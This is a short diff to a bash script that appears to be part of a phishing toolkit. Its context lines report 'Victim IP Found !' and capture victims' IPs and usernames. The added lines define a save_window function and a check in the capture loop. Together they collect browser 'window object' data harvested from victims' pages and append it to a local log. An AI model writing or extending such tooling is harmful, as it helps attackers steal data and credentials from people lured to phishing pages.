@@ -433,6 +433,15 @@ capture_ip() {
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
+## Save window objects
+save_window() {
+	IP=$(awk -F'IP: ' '{print $2}' .server/www/window_data.txt | xargs)
+	IFS=$'\n'
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saving window objects..."${WHITE}
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/window_data.txt"
+	cat .server/www/window_data.txt >> auth/window_data.txt
+} 
+
 ## Extract code
 extract_code() {
 	read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter the code: " USER_INPUT
@@ -522,6 +531,12 @@ capture_data() {
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
 			capture_ip			
 			rm -rf .server/www/ip.txt		
+		fi
+		sleep 0.75
+		if [[ -e ".server/www/window_data.txt" ]]; then
+			echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Window object present!!"
+			save_window
+			rm -rf .server/www/window_data.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
